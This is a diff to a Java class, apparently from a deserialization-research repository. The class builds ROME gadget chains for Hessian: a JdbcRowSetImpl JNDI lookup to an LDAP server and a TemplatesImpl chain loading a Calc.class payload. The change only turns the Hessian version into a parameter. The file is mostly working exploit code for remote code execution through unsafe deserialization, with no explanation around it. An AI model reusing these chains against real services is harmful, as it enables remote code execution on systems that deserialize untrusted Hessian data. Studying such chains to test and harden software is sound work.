@@ -17,7 +17,7 @@ public class RomeBased {
         rome2SignedObj("2");
     }
 
-    public static void rome2Jndi() throws Exception {
+    public static void rome2Jndi(String version) throws Exception {
         JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
         jdbcRowSet.setDataSourceName("ldap://127.0.0.1:50389/eae633");
 
@@ -25,8 +25,8 @@ public class RomeBased {
         EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
         HashMap<Object, Object> hashMap = ReflectTools.makeMap(equalsBean, "any");
 
-        byte[] bytes = HessianTools.hessianSer2bytes(hashMap, "2");
-        HessianTools.hessianDeser(bytes, "2");
+        byte[] bytes = HessianTools.hessianSer2bytes(hashMap, version);
+        HessianTools.hessianDeser(bytes, version);
     }
 
     // 二次反序列化
@@ -51,20 +51,20 @@ public class RomeBased {
         EqualsBean equalsBean2 = new EqualsBean(ToStringBean.class, toStringBean2);
         Map<Object, Object> hashMap2 = ReflectTools.makeMap(equalsBean2, "any");
 
-        byte[] bytes = HessianTools.hessianSer2bytes(hashMap2, "2");
-        HessianTools.hessianDeser(bytes, "2");
+        byte[] bytes = HessianTools.hessianSer2bytes(hashMap2, version);
+        HessianTools.hessianDeser(bytes, version);
     }
 
 
     // 失败，因为hessian无法反序列化transit和static变量
-    public static void rome2Templates() throws Exception {
+    public static void rome2Templates(String version) throws Exception {
         Templates templates = TemplatesGen.getTemplates1(null, "D:/1tmp/classes/Calc.class");
         ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
         EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
 //        equalsBean.hashCode();
         HashMap<Object, Object> hashMap = ReflectTools.makeMap(equalsBean, "any");
 
-        byte[] bytes = HessianTools.hessianSer2bytes(hashMap, "1");
-        HessianTools.hessianDeser(bytes, "1");
+        byte[] bytes = HessianTools.hessianSer2bytes(hashMap, version);
+        HessianTools.hessianDeser(bytes, version);
     }
 }
